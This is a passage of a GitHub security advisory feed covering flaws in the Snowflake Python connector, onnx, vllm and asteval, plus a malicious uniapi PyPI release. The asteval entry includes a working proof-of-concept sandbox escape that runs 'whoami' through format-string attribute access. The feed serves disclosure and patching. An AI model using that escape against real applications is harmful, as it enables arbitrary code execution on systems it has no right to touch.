        <content type="html"><![CDATA[<h3 id="issue">Issue</h3>
<p>Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. The OCSP response cache uses pickle as the serialization format, potentially leading to local privilege escalation.</p>
<p>This vulnerability affects versions 2.7.12 through 3.13.0. Snowflake fixed the issue in version 3.13.1.</p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>The OCSP response cache is saved locally on the machine running the Connector using the pickle serialization format. This can potentially lead to local privilege escalation if an attacker has write access to the OCSP response cache file.</p>
<h3 id="solution">Solution</h3>
<p>Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.</p>
<h3 id="additional-information">Additional Information</h3>
<p>If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href="https://hackerone.com/snowflake?type=team">Vulnerability Disclosure Policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-m4f6-vcj4-w5mx">https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-m4f6-vcj4-w5mx</a></li>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1">https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24794">https://nvd.nist.gov/vuln/detail/CVE-2025-24794</a></li>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/commit/3769b43822357c3874c40f5e74068458c2dc79af">https://github.com/snowflakedb/snowflake-connector-python/commit/3769b43822357c3874c40f5e74068458c2dc79af</a></li>
<li><a href="https://github.com/advisories/GHSA-m4f6-vcj4-w5mx">https://github.com/advisories/GHSA-m4f6-vcj4-w5mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4f6-vcj4-w5mx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-29T20:50:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[snowflake-connector-python] snowflake-connector-python vulnerable to insecure cache files permissions]]></title>
        <id>https://github.com/advisories/GHSA-r2x6-cjg7-8r43</id>
        <link href="https://github.com/advisories/GHSA-r2x6-cjg7-8r43"/>
        <updated>2025-01-29T22:00:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="issue">Issue</h3>
<p>Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. On Linux systems, when temporary credential caching is enabled, the Snowflake Connector for Python will cache temporary credentials locally in a world-readable file.</p>
<p>This vulnerability affects versions 2.3.7 through 3.13.0. Snowflake fixed the issue in version 3.13.1.</p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>On Linux, when either EXTERNALBROWSER or USERNAME_PASSWORD_MFA authentication methods are used with temporary credential caching enabled, the Snowflake Connector for Python will cache the temporary credentials in a local file. In the vulnerable versions of the Driver, this file is created with world-readable permissions.</p>
<h3 id="solution">Solution</h3>
<p>Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.</p>
<h3 id="additional-information">Additional Information</h3>
<p>If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href="https://hackerone.com/snowflake?type=team">Vulnerability Disclosure Policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-r2x6-cjg7-8r43">https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-r2x6-cjg7-8r43</a></li>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1">https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24795">https://nvd.nist.gov/vuln/detail/CVE-2025-24795</a></li>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/commit/3769b43822357c3874c40f5e74068458c2dc79af">https://github.com/snowflakedb/snowflake-connector-python/commit/3769b43822357c3874c40f5e74068458c2dc79af</a></li>
<li><a href="https://github.com/advisories/GHSA-r2x6-cjg7-8r43">https://github.com/advisories/GHSA-r2x6-cjg7-8r43</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r2x6-cjg7-8r43</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-29T20:49:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[onnx] onnx allows Arbitrary File Overwrite in download_model_with_test_data]]></title>
        <id>https://github.com/advisories/GHSA-6rq9-53c3-f7vj</id>
        <link href="https://github.com/advisories/GHSA-6rq9-53c3-f7vj"/>
        <updated>2025-01-27T23:08:36.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in the <code>download_model_with_test_data</code> function of the onnx/onnx framework, versions before 1.16.2, allow for arbitrary file overwrite due to inadequate prevention of path traversal attacks in malicious tar files. This vulnerability enables attackers to overwrite any file on the system, potentially leading to remote code execution, deletion of system, personal, or application files, thus impacting the integrity and availability of the system. The issue arises from the function's handling of tar file extraction without performing security checks on the paths within the tar file, as demonstrated by the ability to overwrite the <code>/home/kali/.ssh/authorized_keys</code> file by specifying an absolute path in the malicious tar file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5187">https://nvd.nist.gov/vuln/detail/CVE-2024-5187</a></li>
<li><a href="https://huntr.com/bounties/50235ebd-3410-4ada-b064-1a648e11237e">https://huntr.com/bounties/50235ebd-3410-4ada-b064-1a648e11237e</a></li>
<li><a href="https://github.com/onnx/onnx/issues/6215">https://github.com/onnx/onnx/issues/6215</a></li>
<li><a href="https://github.com/onnx/onnx/pull/6145">https://github.com/onnx/onnx/pull/6145</a></li>
<li><a href="https://github.com/onnx/onnx/commit/1b70f9b673259360b6a2339c4bd97db9ea6e552f">https://github.com/onnx/onnx/commit/1b70f9b673259360b6a2339c4bd97db9ea6e552f</a></li>
<li><a href="https://github.com/onnx/onnx/commit/3fc3845edb048df559aa2a839e39e95503a0ee34">https://github.com/onnx/onnx/commit/3fc3845edb048df559aa2a839e39e95503a0ee34</a></li>
<li><a href="https://github.com/onnx/onnx/pull/6222">https://github.com/onnx/onnx/pull/6222</a></li>
<li><a href="https://github.com/onnx/onnx/releases/tag/v1.16.2">https://github.com/onnx/onnx/releases/tag/v1.16.2</a></li>
<li><a href="https://github.com/advisories/GHSA-6rq9-53c3-f7vj">https://github.com/advisories/GHSA-6rq9-53c3-f7vj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6rq9-53c3-f7vj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-06T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vllm: Malicious model to RCE by torch.load in hf_model_weights_iterator]]></title>
        <id>https://github.com/advisories/GHSA-rh4j-5rhw-hr54</id>
        <link href="https://github.com/advisories/GHSA-rh4j-5rhw-hr54"/>
        <updated>2025-01-27T20:50:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>The vllm/model_executor/weight_utils.py implements hf_model_weights_iterator to load the model checkpoint, which is downloaded from huggingface. It use torch.load function and weights_only parameter is default value False. There is a security warning on <a href="https://pytorch.org/docs/stable/generated/torch.load.html">https://pytorch.org/docs/stable/generated/torch.load.html</a>, when torch.load load a malicious pickle data it will execute arbitrary code during unpickling.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability can be exploited to execute arbitrary codes and OS commands in the victim machine who fetch the pretrained repo remotely.</p>
<p>Note that most models now use the safetensors format, which is not vulnerable to this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://pytorch.org/docs/stable/generated/torch.load.html">https://pytorch.org/docs/stable/generated/torch.load.html</a></li>
<li>Fix: <a href="https://github.com/vllm-project/vllm/pull/12366">https://github.com/vllm-project/vllm/pull/12366</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54">https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24357">https://nvd.nist.gov/vuln/detail/CVE-2025-24357</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/12366">https://github.com/vllm-project/vllm/pull/12366</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/d3d6bb13fb62da3234addf6574922a4ec0513d04">https://github.com/vllm-project/vllm/commit/d3d6bb13fb62da3234addf6574922a4ec0513d04</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.7.0">https://github.com/vllm-project/vllm/releases/tag/v0.7.0</a></li>
<li><a href="https://pytorch.org/docs/stable/generated/torch.load.html">https://pytorch.org/docs/stable/generated/torch.load.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rh4j-5rhw-hr54">https://github.com/advisories/GHSA-rh4j-5rhw-hr54</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rh4j-5rhw-hr54</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-27T20:50:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uniapi] uniapi version 1.0.7 contained an information harvesting script.]]></title>
        <id>https://github.com/advisories/GHSA-gvvw-rr8m-fj76</id>
        <link href="https://github.com/advisories/GHSA-gvvw-rr8m-fj76"/>
        <updated>2025-01-27T12:30:29.000Z</updated>
        <content type="html"><![CDATA[<p>uniapi version 1.0.7 introduces code that would execute on import of the module and download a script from a remote URL, and would then execute the downloaded script in a thread. The downloaded script would harvest system information and <code>POST</code> the information to another remote URL. This code was found in the PyPI release artifacts and was not present in the public GitHub repository.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/uniapi/PYSEC-2025-2.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/uniapi/PYSEC-2025-2.yaml</a></li>
<li><a href="https://inspector.pypi.io/project/uniapi/1.0.7/packages/0f/40/c6e06c22bbc22ef45f40bf5a7711763fa08fec4d16b4718d86fd60970131/uniapi-1.0.7.tar.gz/uniapi-1.0.7/uniapi/__init__.py#line.11">https://inspector.pypi.io/project/uniapi/1.0.7/packages/0f/40/c6e06c22bbc22ef45f40bf5a7711763fa08fec4d16b4718d86fd60970131/uniapi-1.0.7.tar.gz/uniapi-1.0.7/uniapi/__init__.py#line.11</a></li>
<li><a href="https://github.com/advisories/GHSA-gvvw-rr8m-fj76">https://github.com/advisories/GHSA-gvvw-rr8m-fj76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gvvw-rr8m-fj76</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-27T12:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asteval] ASTEVAL Allows Maliciously Crafted Format Strings to Lead to Sandbox Escape]]></title>
        <id>https://github.com/advisories/GHSA-3wwr-3g9f-9gc7</id>
        <link href="https://github.com/advisories/GHSA-3wwr-3g9f-9gc7"/>
        <updated>2025-01-25T00:54:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If an attacker can control the input to the <code>asteval</code> library, they can bypass asteval's restrictions and execute arbitrary Python code in the context of the application using the library.</p>
<h3 id="details">Details</h3>
<p>The vulnerability is rooted in how <code>asteval</code> performs handling of <code>FormattedValue</code> AST nodes. In particular, the <a href="https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507"><code>on_formattedvalue</code></a> value uses the <a href="https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/">dangerous format method of the str class</a>, as shown in the vulnerable code snippet below:</p>
<pre><code class="language-py">    def on_formattedvalue(self, node): # ('value', 'conversion', 'format_spec')
        "formatting used in f-strings"
        val = self.run(node.value)
        fstring_converters = {115: str, 114: repr, 97: ascii}
        if node.conversion in fstring_converters:
            val = fstring_converters[node.conversion](val)
        fmt = '{__fstring__}'
        if node.format_spec is not None:
            fmt = f'{{__fstring__:{self.run(node.format_spec)}}}'
        return fmt.format(__fstring__=val)
</code></pre>
<p>The code above allows an attacker to manipulate the value of the string used in the dangerous call <code>fmt.format(__fstring__=val)</code>. This vulnerability can be exploited to access protected attributes by intentionally triggering an <code>AttributeError</code> exception. The attacker can then catch the exception and use its <code>obj</code> attribute to gain arbitrary access to sensitive or protected object properties.</p>
<h3 id="poc">PoC</h3>
<p>The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the <code>whoami</code> command on the host machine:</p>
<pre><code class="language-py">from asteval import Interpreter
aeval = Interpreter()
code = """
# def lender():
#     ga
    
def pwn():
    try:
        f"{dict.mro()[1]:'\\x7B__fstring__.__getattribute__.s\\x7D'}"
    except Exception as ga:
        ga = ga.obj
        sub = ga(dict.mro()[1],"__subclasses__")()
        importer = None
        for i in sub:
            if "BuiltinImporter" in str(i):
                importer = i.load_module
                break
        os = importer("os")
        os.system("whoami")

# pre commit cfb57f0beebe0dc0520a1fbabc35e66060c7ea71, it was required to modify the AST to make this work using the code below
# pwn.body[0].handlers[0].name = lender.body[0].value # need to make it an identifier so node_assign works
        
pwn()
"""
aeval(code)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7">https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24359">https://nvd.nist.gov/vuln/detail/CVE-2025-24359</a></li>
<li><a href="https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2">https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2</a></li>
<li><a href="https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507">https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507</a></li>
<li><a href="https://lucumr.pocoo.org/2016/12/29/careful-with-str-format">https://lucumr.pocoo.org/2016/12/29/careful-with-str-format</a></li>
<li><a href="https://github.com/advisories/GHSA-3wwr-3g9f-9gc7">https://github.com/advisories/GHSA-3wwr-3g9f-9gc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wwr-3g9f-9gc7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-24T18:45:30.000Z</published>
    </entry>
</feed>